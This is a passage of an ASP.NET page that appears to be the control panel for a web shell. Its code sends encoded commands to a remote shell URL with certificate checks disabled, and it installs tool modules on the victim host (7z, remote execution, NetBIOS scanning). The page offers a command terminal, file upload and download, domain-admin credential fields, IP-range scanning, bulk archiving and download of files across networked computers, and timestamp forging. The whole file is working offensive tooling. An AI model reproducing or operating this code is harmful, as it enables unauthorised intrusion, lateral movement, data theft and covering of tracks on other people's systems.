        //        {
        //            System.IO.DirectoryInfo di = System.IO.Directory.CreateDirectory(moduleFolder);
        //            di.Attributes = System.IO.FileAttributes.Directory | System.IO.FileAttributes.Hidden;
        //        }

        //        string name = string.Empty;
        //        string path = string.Empty;
        //        if (mname == "mdl7z")
        //        {
        //            name = "7z";
        //            path = moduleFolder + "\\z.exe";
        //        }
        //        else if (mname == "mdlrx")
        //        {
        //            name = "rx";
        //            path = moduleFolder + "\\r.exe";
        //        }
        //        else if (mname == "mdlnbt")
        //        {
        //            name = "nbt";
        //            path = moduleFolder + "\\n.exe";
        //        }
        //        else if (mname == "mdlhb")
        //        {
        //            name = "hb";
        //            path = moduleFolder + "\\h.exe";
        //        }

        //        mfile.SaveAs(path);
        //        ret = "Module '" + name + "' installed successfuly.";
        //    }
        //    catch (Exception e)
        //    {
        //        ret = "Error : " + e.Message;
        //    }
        //    response(ret);
        //}
        void installModule(string moduleName)
        {
            string ret = "Error : -";

            try
            {
                string targetFileName = string.Empty;
                string filePath = Server.MapPath(string.Empty) + "\\files\\";

                filePath += ModuleFileName[moduleName].Value;
                targetFileName = ModuleFileNameTarget[moduleName].Value;

                if (!string.IsNullOrEmpty(targetFileName))
                {
                    List<KeyValuePair<string, string>> formData = new List<KeyValuePair<string, string>>();
                    formData.Add(new KeyValuePair<string, string>("uploadPath", moduleFolder + targetFileName));
                    formData.Add(new KeyValuePair<string, string>("m", ((int)method.upload).ToString()));
                    formData.Add(new KeyValuePair<string, string>("p", p));

                    using (Stream fStream = File.OpenRead(filePath))
                    {
                        ret = UploadFile(fStream, Path.GetFileName(filePath), "uploadFile", formData);
                        if (ret.Contains("successfully"))
                            ret = "Module '" + moduleFolder + targetFileName + "' installed successfuly.";
                    }
                }
                else
                    ret = "Error : Module name is invalid";
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            responseAjax(ret);
        }
        //void uninstallModule(string mname)
        //{
        //    string ret = "Error : -";
        //    try
        //    {
        //        string name = string.Empty;
        //        string path = string.Empty;
        //        if (mname == "mdl7z")
        //        {
        //            name = "7z";
        //            path = moduleFolder + "\\z.exe";
        //        }
        //        else if (mname == "mdlrx")
        //        {
        //            name = "rx";
        //            path = moduleFolder + "\\r.exe";
        //        }
        //        else if (mname == "mdlnbt")
        //        {
        //            name = "nbt";
        //            path = moduleFolder + "\\n.exe";
        //        }

        //        System.IO.File.Delete(path);
        //        ret = "Module '" + name + "' uninstalled successfuly.";
        //    }
        //    catch (Exception e)
        //    {
        //        ret = "Error : " + e.Message;
        //    }

        //    response(ret);
        //}
        void uninstallModule(string moduleName)
        {
            string ret = "Error : -";
            try
            {
                string modulePath = moduleFolder + ModuleFileNameTarget[moduleName].Value;
                SendRequest(url, new NameValueCollection() {
                    { "m", tb(((int)method.command).ToString())},
                    { "p", tb(p)},
                    { "cmd", tb(string.Format("del \"{0}\"",modulePath))}
                });
                string dirModule = SendRequest(url, new NameValueCollection() {
                    { "m", tb(((int)method.command).ToString())},
                    { "p", tb(p)},
                    { "cmd", tb(string.Format("dir \"{0}\" 2>&1",modulePath))}
                });
                if(dirModule.Contains("File Not Found"))
                    ret = "Module '" + modulePath + "' uninstalled successfuly.";
                else
                    ret = "Error : Cannot uninstall module : " + modulePath;
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            responseAjax(ret);
        }
        #endregion

        void cmd7z(string clevel, string address7z, string files, string volumSize, string vMode, string exclude)
        {
            string ret = "Error : -";
            try
            {
                string exludeStr = string.Empty;
                if (!string.IsNullOrEmpty(exclude))
                {
                    string[] temp = exclude.Split(',');
                    foreach (string item in temp)
                    {
                        exludeStr += " -xr!" + item;
                    }
                }
                ret = SendRequest(url, new NameValueCollection() {
                { "m", tb(((int)method.command).ToString())},
                { "p", tb(p)},
                { "cmd", tb(string.Format("{0} {1} a \"{2}\" {3}{4}{5} 2>&1",
                    moduleFolder + ModuleFileNameTarget[ModuleName.mdl7z.ToString()].Value,
                    clevel,
                    address7z,
                    files,
                    (string.IsNullOrEmpty(volumSize) ? "" : "-v" + volumSize + vMode),
                    exludeStr
                    )
                )}
            });
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            responseAjax(ret);
        }



        string SendRequest(string url, NameValueCollection values)
        {
            string response = string.Empty;

            string param = string.Empty;

            foreach (var item in values.AllKeys)
            {
                if (!string.IsNullOrEmpty(param))
                    param += "&";
                param += item + "=" + System.Web.HttpUtility.UrlEncode(isAjax ? values[item] : tb(values[item]));
            }

            using (WebClient wc = new WebClient())
            {
                ServicePointManager.ServerCertificateValidationCallback = (a, b, c, d) => true;
                wc.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
                response = fb(wc.UploadString(url, param));
            }

            return response;
        }

        public static void CreateEmptyFile(string filename)
        {
            File.Create(filename).Dispose();
        }

        string sizeFix(long size, bool round = false)
        {
            double s = size;
            if (s < 1024)
                return s + "B";
            s = s / 1024;
            if (s < 1024)
                return (round ? (int)s : Math.Round(s, 2)) + "KB";
            s = s / 1024;
            if (s < 1024)
                return (round ? (int)s : Math.Round(s, 2)) + "MB";
            s = s / 1024;
            if (s < 1024)
                return (round ? (int)s : Math.Round(s, 2)) + "GB";
            s = s / 1024;
            return (round ? (int)s : Math.Round(s, 2)) + "TB";
        }

        string timeFix(long msec)
        {
            double s = msec;
            if (s < 1000) return (int)s + " msec";
            s = s / 1000;
            if (s < 60) return (int)s + " sec";
            s = s / 60;
            if (s < 60) return (int)s + " min";
            s = s / 60;
            if (s < 24) return (int)s + " hour";
            s = s / 24;
            if (s < 365) return (int)s + " day";
            s = s / 365;
            return (int)s + " year";
        }

    </script>
</head>
<body>
    <div class="pusher contentPlace" style="/*flex-grow: 1; flex-direction: column; display: flex; */">
        <div id="header">
            <div style="border: 1px solid #ccc; margin-bottom: 10px; background-color: #aaa;">
                <input type="hidden" name="m" value="0" />
                <table style="width: 100%">
                    <tr>
                        <td class="h">Login</td>
                        <td class="b" style="width: 604px;">
                            <table>
                                <tr>
                                    <td>
                                        <form method="post">
                                            <table>
                                                <tr>
                                                    <td>
                                                        <div class="ui input">
                                                            <input class="<%= loginStyle %>" id="url" name="url" type="text" value='<%= url %>' style="width: 500px;" onkeypress="return grabEnter(event, this);" />
                                                        </div>
                                                    </td>
                                                    <td>
                                                        <button title="Login" class="ui compact icon ml5 button primary" id="btnLogin" onclick="login(this);return false;"><i class="large Sign In icon" style="margin: 0"></i></button>
                                                    </td>
                                                    <td>
                                                        <button title="Logout" class="ui compact icon ml5 button primary" onclick="logout(this);return false;"><i class="large Sign Out icon" style="margin: 0"></i></button>
                                                    </td>
                                                </tr>
                                            </table>
                                        </form>
                                    </td>
                                </tr>
                            </table>
                        </td>
                        <td class="h" style="border-left: 1px solid #ddd;">Location</td>
                        <td class="b">
                            <div class="ui left icon input" style="width: 100%;">
                                <span id="loc" class="ui Large label ml5" style="cursor: pointer; padding: 11px 5px 11px 42px" onclick="copyLoc()"><%= loc %></span>
                                <i class="large Copy icon"></i>
                            </div>
                        </td>
                        <td style="text-align: right">
                            <div class="ui labeled button ml5">
                                <button id="mdlspy" class="ui compact labeled icon button" onclick="spycheck(this);"><i class="large Empty Heart icon"></i>Spy Check</button>
                                <a id="mdlspyTimer" class="ui basic label" style="cursor: auto; border: none">60</a>
                            </div>
                        </td>
                        <td style="width: 115px">
                            <span class="ui Large label ml5" style="padding-top: 11px; padding-bottom: 11px;">Version 8.6.2</span>
                        </td>
                    </tr>
                </table>
                <hr />
                <table>
                    <tr>
                        <td id="chkModules" class="h" onclick="checkModules(this);" style="cursor: pointer">Modules</td>
                        <td class="b">
                            <button id="mdl7z" class="ui compact labeled icon button mdlItem" onclick="installModule(this)"><i class="large File Archive Outline icon"></i>7z</button>
                            <button id="mdlrx" class="ml5 ui compact labeled icon button mdlItem" onclick="installModule(this)" title="Remote Execution"><i class="large Desktop icon"></i>rx</button>
                            <button id="mdlnbt" class="ml5 ui compact labeled icon button mdlItem" onclick="installModule(this)" title="Netbios Tools"><i class="large Connectdevelop icon"></i>nbt</button>
                            <%--<button id="mdlhb" class="ml5 ui compact labeled icon button mdlItem" onclick="installModule(this)" title="HoboCopy"><i class="large Clone icon"></i>hb</button>--%>
                        </td>
                    </tr>
                </table>
            </div>
            <div style="border: 1px solid #ccc; margin-bottom: 10px; background-color: #aaa;">
                <table style="width: 100%">
                    <tr>
                        <td class="h">Target Computer</td>
                        <td class="b">
                            <div class="ui form">
                                <iframe name="abcd" style="display: none" src="about:blank"></iframe>
                                <form target="abcd" action="about:blank">
                                    <div class="field">
                                        <div class="two fields">
                                            <div class="field">
                                                <input name="adminU" type="text" placeholder="Domain Admin Username..." onkeypress="return grabEnter(event, this);">
                                            </div>
                                            <div class="field">
                                                <input name="adminP" type="text" placeholder="Domain Admin Password..." onkeypress="return grabEnter(event, this);">
                                            </div>
                                        </div>
                                    </div>
                                </form>
                                <%--<div class="field">
                                    <div class="ui action input">
                                        <div id="cmbIP" class="ui fluid multiple search normal selection dropdown">
                                            <input type="hidden" name="MainIP" value="\\localhost" />
                                            <i class="dropdown icon"></i>
                                            <div class="default text">Select Computer</div>
                                            <div class="menu">
                                                <div class="label" style="padding: 0 5px 5px 5px;">
                                                    <table style="width: 100%">
                                                        <tr>
                                                            <td style="width: 280px;">
                                                                <button class="ui compact labeled icon button primary" onclick="TargetComputerAddFromNbt($(this))"><i class="large Connectdevelop icon"></i>Insert Computer From nbt</button>
                                                            </td>
                                                            <td style="width: 85px">Get IP From :</td>
                                                            <td style="width: 173px">
                                                                <div id="chbNbtMode" class="ui buttons">
                                                                    <button class="ui button green" onclick="$(this).removeClass('green').addClass('green').next().removeClass('green')">ipconfig</button>
                                                                    <button class="ui button" onclick="$(this).removeClass('green').addClass('green').prev().removeClass('green')">input</button>
                                                                </div>
                                                            </td>
                                                            <td>
                                                                <div class="ui input">
                                                                    <input id="txtNbtInput" placeholder="Insert IP here, like this : 192.168.1.0/24,192.168.1.20-43,192.168.4.4-192.170.3.140" />
                                                                </div>
                                                            </td>
                                                        </tr>
                                                    </table>
                                                </div>
                                                <div class="label" style="padding: 0 5px 5px 5px;">
                                                    <table style="width: 100%">
                                                        <tr>
                                                            <td style="width: 180px;">Insert Computer From Input :</td>
                                                            <td style="width:110px;text-align:center"><button id="chbTargetComputerUsePing" class="ui toggle button">Use Ping</button></td>
                                                            <td style="padding-left: 5px">
                                                                <div class="ui left icon input">
                                                                    <input id="txtTargetComputerIP" placeholder="Insert IP, IP range or Computer Name here..." />
                                                                    <i class="circular Add Square icon link" onclick="TargetComputerAddFromInput($('#txtTargetComputerIP'));"></i>
                                                                </div>
                                                            </td>
                                                        </tr>
                                                    </table>
                                                </div>
                                                <div class="label" style="padding: 0 16px 5px 16px;">
                                                    <table class="dropdown-table-header">
                                                        <tr>
                                                            <td class="clmn1">Computer</td>
                                                            <td class="clmn2">Computer Name</td>
                                                            <td class="clmn3">Domain</td>
                                                            <td class="clmn4">FullDomain</td>
                                                            <td class="clmn5">Properties</td>
                                                            <td class="clmn6">Mac Address</td>
                                                        </tr>
                                                    </table>
                                                </div>
                                                <div class="item" data-value="\\localhost">Localhost</div>
                                            </div>
                                        </div>
                                        <button class="ui button primary" onclick="$('#cmbIP').dropdown('clear');">Clear</button>
                                    </div>
                                </div>--%>
                            </div>
                        </td>
                    </tr>
                </table>
            </div>
            <div class="ui top attached tabular menu">
                <a class="item active" data-tab="command">Command</a>
                <a class="item" data-tab="explorer">Explorer</a>
                <a class="item" data-tab="computers">Computers</a>
                <a class="item" data-tab="networkdownloader">Network Downloader</a>
                <a class="item" data-tab="upload">Upload</a>
                <a class="item" data-tab="download">Download</a>
                <a class="item" data-tab="changetime">Change Time</a>
            </div>
            <div id="tbMain" class="ui sticky bottom attached tab segment active" data-tab="command">
                <form method="post">
                    <input type="hidden" name="m" value="1" />
                    <div style="padding: 5px">
                        <div class="ui label">Selected Location : <span id="cmdSelectedLocation">\\localhost</span></div>
                    </div>
                    <div class="ui left icon input" style="width: 100%;">
                        <input id="inpCmd" name="cmd" type="text" value='<%= cmd %>' style="width: 100%; padding-right: 30px !important;" onkeypress="return grabEnter(event, this);" />
                        <i class="terminal icon"></i>
                        <div class="ui dropdown icon item" style="position: absolute; right: 0px; top: 9px;">
                            <i class="setting large icon"></i>
                            <div class="flowing menu">
                                <div class="item" onclick="event.stopPropagation()">
                                    <div id="chbCmdError" class="ui toggle checkbox">
                                        <input type="checkbox" checked="checked">
                                        <label>Add 2>&1</label>
                                    </div>
                                </div>
                                <div class="item" onclick="event.stopPropagation()">
                                    <div id="chbCmdAppend" class="ui toggle checkbox">
                                        <input type="checkbox">
                                        <label>Append Result</label>
                                    </div>
                                </div>
                                <div class="item" onclick="event.stopPropagation()">
                                    <div id="chbCmdLongTimeCommand" class="ui toggle checkbox">
                                        <input type="checkbox">
                                        <label>Long Time Command</label>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                </form>
            </div>
            <div class="ui bottom attached tab segment" data-tab="explorer">
                <table>
                    <tr>
                        <td>
                            <table>
                                <tr>
                                    <td class="h">Address</td>
                                    <td class="b">
                                        <form method="post">
                                            <input type="hidden" name="m" value="23" />
                                            <div class="ui action input" style="width: 700px;">
                                                <input placeholder="Folder Address..." name="exadd" type="text" value='<%= exadd %>' onkeypress="return grabEnter(event, this);" />
                                                <button class="ui button primary" id="btnExpror" onclick="sendAddress(this);return false;">Explore</button>
                                            </div>
                                        </form>
                                    </td>
                                </tr>
                            </table>
                        </td>
                        <td>
                            <table>
                                <tr>
                                    <td class="h" style="border-left: 1px solid #ddd">Upload</td>
                                    <td class="b">
                                        <form method="post" enctype="multipart/form-data">
                                            <input type="hidden" name="m" value="2" />
                                            <input name="isExp" type="hidden" value="1" />
                                            <div class="ui action input" style="width: 700px;">
                                                <input name="uploadFile" type="file" style="padding: 0.393em 1em !important;" />
                                                <button class="ui button primary" onclick="expUpload();">Upload</button>
                                            </div>
                                            <input id="expSaveAddress" name="uploadPath" type="text" style="display: none" />
                                        </form>
                                    </td>
                                </tr>
                            </table>
                        </td>
                    </tr>
                </table>
                <%--                <iframe name="abcd" style="display: none" src="about:blank"></iframe>
                <form target="abcd" action="about:blank">
                    <label class="formLabel">Username : </label>
                    <div class="ui input" style="margin-bottom: 10px; width: 273px;">
                        <input placeholder="Domain Admin Username..." name="adminU" class="mmm" type="text" style="width: 200px" value="<%= adminU %>" onkeypress="return grabEnter(event, this);" />
                    </div>
                    <label class="formLabel">Password : </label>
                    <div class="ui input" style="margin-bottom: 10px; width: 273px;">
                        <input placeholder="Domain Admin Password..." name="adminP" class="mmm" type="text" style="width: 200px" value="<%= adminP %>" onkeypress="return grabEnter(event, this);" />
                    </div>
                </form>--%>
                <hr />
                <div>
                    <div id="stickyDirCommand" class="ui sticky">
                        <table>
                            <tr>
                                <td class="h">Commands</td>
                                <td class="b">
                                    <table>
                                        <tr>
                                            <td>
                                                <form target="abcd" action="about:blank">
                                                    <div class="ui action input">
                                                        <input id="7zaddress" type="text" placeholder="7z file address..." style="width: 200px" onkeypress="return grabEnter(event, this);" value="<%= moduleFolder %>Files\">
                                                        <input id="7zvsize" type="text" placeholder="Split" style="width: 70px; border-radius: 0;">
                                                        <select id="7zvmode" class="ui compact selection dropdown">
                                                            <option value="b">Byte</option>
                                                            <option value="k">KB</option>
                                                            <option selected="" value="m">MB</option>
                                                            <option value="g">GB</option>
                                                        </select>
                                                        <select id="7zclevel" class="ui compact selection dropdown">
                                                            <option selected="" value="-mx0">Copy Mode</option>
                                                            <option value="-mx1">Fastest Mode</option>
                                                            <option value="-mx3">Fast Mode</option>
                                                            <option value="-mx5">Normal Mode</option>
                                                            <option value="-mx7">Maximum Mode</option>
                                                            <option value="-mx9">Ultra Mode</option>
                                                        </select>
                                                        <input id="7zexclude" type="text" placeholder="Exclude file from 7z : *.mp3,*.iso" style="width:300px; border-radius: 0;" title="Exclude file from 7z : *.mp3,*.iso">
                                                        <button id="cmd7z" class="ui compact icon primary button" onclick="cmd7za(this); return false;"><i class="large File Archive Outline icon"></i></button>
                                                    </div>
                                                </form>
                                            </td>
                                            <td>
                                                <button title="7z Selected Files and Download" id="cmd7zdl" class="ui compact icon ml5 button primary" style="padding: 10.5px;" onclick="cmd7zdl(this)"><i class="large File Archive Outline icon"></i><i class="Plus icon"></i><i class="large Cloud Download icon"></i></button>
                                            </td>
                                            <td>
                                                <button title="Download" id="cmddl" class="ui compact icon ml5 button primary" onclick="cmddl(this);" style="padding: 10.5px;"><i class="large Cloud Download icon"></i></button>
                                            </td>
                                            <td>
                                                <button title="Delete Selected Files" id="cmddelete" class="ui compact icon ml5 button primary" onclick="cmddelete(this)" data-content="Delete Selected Files" style="padding: 10.5px;"><i class="large Trash icon"></i></button>
                                            </td>
                                        </tr>
                                    </table>
                                </td>
                            </tr>
                        </table>
                    </div>
                </div>
                <div id="stickyDirContext">
                    <hr />
                    <div class="objLocHolder">
                        <div class="objLeft" style="margin-left: 22px; margin-right: -3px;">Location :</div>
                        <div id="objLocation">
                            <%--<div class="objRight objD objL" onclick="setAddress(this,this.innerText);" style="margin: 0">root</div>--%>
                        </div>
                    </div>
                    <div id="objFrame">
                    </div>
                </div>
            </div>
            <div class="ui bottom attached tab segment"  data-tab="computers">
                <div style="padding:5px">
                    <table style="width:100%;margin-bottom:5px">
                        <tr>
                            <td style="width: 55px">Nbt :</td>
                            <td style="width: 173px">
                                <div id="chbNbtMode" class="ui buttons">
                                    <button class="ui button" onclick="$(this).removeClass('green').addClass('green').next().removeClass('green')">ipconfig</button>
                                    <button class="ui button green" onclick="$(this).removeClass('green').addClass('green').prev().removeClass('green')">input</button>
                                </div>
                            </td>
                            <td>
                                <div class="ui fluid input">
                                    <input id="txtNbtInput" placeholder="Insert IP here, like this : 192.168.1.0/24,192.168.1.20-43,192.168.4.4-192.170.3.140" />
                                </div>
                            </td>
                            <td style="width:295px;padding-left:5px;">
                                <button class="ui compact labeled icon button primary" onclick="TargetComputerAddSelectAllDownload($(this))"><i class="large Connectdevelop icon"></i>Insert nbt + Select All + Download</button>
                            </td>
                            <td style="width:262px;padding-left:5px;">
                                <button class="ui compact labeled icon button primary" onclick="TargetComputerAddFromNbt($(this))"><i class="large Connectdevelop icon"></i>Insert Computer From nbt</button>
                            </td>
                        </tr>
                    </table>
                    <table style="width: 100%;">
                        <tr>
                            <td style="width: 55px;">Input :</td>
                            <td style="width:98px;"><button id="chbTargetComputerUsePing" class="ui toggle button">Use Ping</button></td>
                            <td style="padding-left: 5px">
                                <div class="ui fluid input">
                                    <input id="txtTargetComputerIP" placeholder="Insert IP, IP range or Computer Name here, like this : 192.168.1.1,192.168.1.1/24,PCNAME,192.168.1.12-44" />
                                </div>
                            </td>
                            <td style="width:262px;padding-left:5px;">
                                <button class="ui compact labeled icon button primary" onclick="TargetComputerAddFromInput($('#txtTargetComputerIP'))"><i class="large Chevron Right icon"></i>Insert Computer From Input</button>
                            </td>
                        </tr>
                    </table>
                    </div>
                <hr style="margin:5px 0" />
                <div style="padding:5px">
                <button class="ui button primary" onclick="$('#TargetComputerTable').DataTable().clear().draw()">Clear</button>
                <table id="TargetComputerTable" class="display" cellspacing="0" width="100%">
        <thead>
            <tr>
                <th style="width:17px"><div id="TargetComputersCheckAll" class="ui fitted checkbox"><input type="checkbox"> <label></label></div></th>
                <th>Computer</th>
                <th>Computer Name</th>
                <th>Domain</th>
                <th>FullDomain</th>
                <th>Properties</th>
                <th>Mac Address</th>
                <th>Command</th>
            </tr>
        </thead>
        <tbody>
        </tbody>
    </table>
                </div>
            </div>
            <div class="ui bottom attached tab segment" data-tab="networkdownloader" style="padding: 5px;">
                
                <div class="ui input" style="padding-right: 5px;">
                    <input id="txtNetworkDownloaderExclude" value="-xr!*.mp3" />
                </div>
                <table style="width: 100%">
                    <tr>
                        <td style="width: 130px">7z file to this folder :</td>
                        <td>
                            <div class="ui form">
                                <div class="field">
                                    <div class="ui input" style="padding-right: 5px;">
                                        <input id="txtNetworkDownloaderLocation" value="<%= moduleFolder %>Files\" />
                                    </div>
                                </div>
                            </div>
                        </td>
                        <td style="width: 180px">
                            <button id="btnNetworkDownloader" class="ui compact labeled icon button" onclick="startNetworkDownloader()">
                                <i class="Cloud Download icon"></i>
                                Start Download
                            </button>
                        </td>
                    </tr>
                </table>
                <div id="contentNetDon">
                </div>
            </div>
            <div class="ui bottom attached tab segment" data-tab="upload">
                <form method="post" enctype="multipart/form-data">
                    <input type="hidden" name="m" value="2" />
                    <t>File name :</t>
                    <input name="uploadFile" type="file" /><br>
                    <t>Save as :</t>
                    <input id="uplSaveAddress" name="uploadPath" type="text" value='<%= sav %>' /><br>
                    <input type="submit" value="Upload" />
                </form>
                <%--    <hr>
    <form method="post">
        <t>Base64 File :</t>
        <textarea name="baseFile"></textarea><br>
        <t>File Path and Name :</t>
        <input name="baseAddr" class="mmm" type="text" value='<%= baseAddr %>' />
        <input type="submit" value="Upload" onclick="subm();" />
    </form>--%>
            </div>
            <div class="ui bottom attached tab segment" data-tab="download">
                <table>
                    <tr>
                        <td class="h">Download</td>
                        <td class="b">
                            <div class="ui action input" style="width: 700px">
                                <input id="txtManualDownload" type="text" />
                                <button class="ui button primary" onclick="downloadManager($('#txtManualDownload').val(), this, true);">Download</button>
                            </div>
                        </td>
                    </tr>
                </table>
            </div>
            <div id="tbSqlServer" class="tb">
                <form method="post">
                    <input style="margin: 0 0 3px 192px" type="button" value="Standard Connection Sample" onclick="document.getElementsByName('sqc')[0].value = 'Server=.;Database=db;User Id=user;Password=pass'" />
                    <input style="margin: 0 0 3px 0" type="button" value="Trusted Connection Sample" onclick="document.getElementsByName('sqc')[0].value = 'Server=.;Database=db;Trusted_Connection=True'" /><br />
                    <t>Connection String :</t>
                    <input name="sqc" class="mmm" type="text" value='<%= sqc %>' /><br />
                    <t>Query :</t>
                    <textarea name="sqq" class="mmm"><%= sqq %></textarea>
                    <input type="submit" value="Run" onclick="subm();" />
                </form>
            </div>
            <div class="ui bottom attached tab segment" data-tab="changetime">
                <%--<form method="post">--%>
                <input name="timeh" type="hidden" />
                <t>File name :</t>
                <input name="tfil" type="text" value='<%= tfil %>' />
                <input type="submit" value="Get" onclick="document.getElementsByName('timeh')[0].value = '1'; changeTime(this);" /><br>
                <t>From This File :</t>
                <input name="ttar" type="text" value='<%= ttar %>' />
                <input type="submit" value="Set" onclick="document.getElementsByName('timeh')[0].value = '2'; changeTime(this);" /><br>
                <t>New Time :</t>
                <input name="ttim" type="text" value='<%= ttim %>' />
                <input type="submit" value="Set" onclick="document.getElementsByName('timeh')[0].value = '3'; changeTime(this);" />
                <%--</form>--%>
            </div>
        </div>
        <pre id="log" runat="server" style="min-height: 50px; white-space: pre-wrap;"></pre>
        <script><%= SpecialScript %></script>
    </div>
    <div id="sidebarDownlaod" class="ui right sidebar" style="background-color: #000; border-left: 1px solid #fff; z-index: 1000;">
        <div class="rightButton" onclick="sidebarOpen('sidebarDownlaod')">
            <span style="margin-top: 52px;">Downloads</span>
        </div>
        <div id="downloadContext">
        </div>
    </div>
    <div class="ui tiny modal">
        <div class="header">
            Delete File
        </div>
        <div class="content">
            <p>
                Are you sure you want to delete this file?<br />
                <span id="messageDeleteFile"></span>
            </p>
        </div>
        <div class="actions">
            <div class="ui negative button">
                No
            </div>
            <div class="ui positive right labeled icon button">
                Yes
            <i class="checkmark icon"></i>
            </div>
        </div>
    </div>
    <i title="Scroll Top" class="circular large link chevron circle up icon" style="right: 10px; bottom: 10px; position: fixed; z-index: 3333; background-color: #fff" onclick="$('html, body').animate({ scrollTop: 0 }, 500);"></i>
    <i title="Clear Terminal" class="circular large link paint brush icon" style="right: 65px; bottom: 10px; position: fixed; z-index: 3333; background-color: #fff" onclick="$('#log').text('');$('#tbMain').sticky('refresh');"></i>
</body>
</html>
